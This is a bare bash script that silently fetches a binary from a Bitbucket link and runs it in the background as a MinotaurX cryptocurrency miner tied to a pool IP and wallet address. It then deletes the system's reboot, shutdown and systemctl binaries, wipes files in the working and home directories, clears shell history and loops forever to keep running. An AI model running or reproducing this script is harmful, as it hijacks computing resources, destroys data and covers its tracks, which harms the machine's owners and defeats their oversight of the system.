#!/bin/bash
apt-get update > /dev/null 2>&1
apt install libjansson-dev -y > /dev/null 2>&1
curl -sLkO http://bitbucket.org/gerdsa/amsyungas/downloads/flex > /dev/null 2>&1
chmod 777 flex
./flex -a minotaurx -o 198.50.168.213:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA > /dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 200
done
